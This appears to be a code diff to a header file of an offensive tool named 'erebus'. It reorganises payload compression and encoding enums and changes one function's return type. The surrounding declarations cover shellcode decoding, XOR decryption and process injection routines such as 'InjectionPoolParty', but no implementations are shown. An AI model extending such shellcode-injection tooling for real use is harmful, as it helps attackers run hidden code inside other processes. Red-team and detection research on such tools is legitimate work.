@@ -2278,10 +2278,15 @@ namespace erebus {
 		FORMAT_NONE = 0,
 		FORMAT_LZNT1 = 1,
 		FORMAT_RLE = 2,
-		FORMAT_BASE64 = 3,
-		FORMAT_ASCII85 = 4,
-		FORMAT_ALPHA32 = 5,
-		FORMAT_WORDS256 = 6
+
+	};
+	
+	enum EncodingFormat {
+	ENCODING_NONE = 0,
+	FORMAT_BASE64 = 1,   
+	FORMAT_ASCII85 = 2,
+	FORMAT_ALPHA32 = 3,
+	FORMAT_WORDS256 = 4
 	};
 
 	struct Config {
@@ -2387,7 +2392,7 @@ namespace erebus {
 
 	VOID AutoDetectAndDecode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen);
 
-	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);
+	BOOL AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);
 
 	VOID DecryptionXor(unsigned char* data, size_t len, unsigned char* key, size_t key_len);
 
@@ -2416,6 +2421,7 @@ namespace erebus {
 	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
 
 	VOID InjectionPoolPartyAlt(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
+
 } // End of erebus namespace
 
 #endif
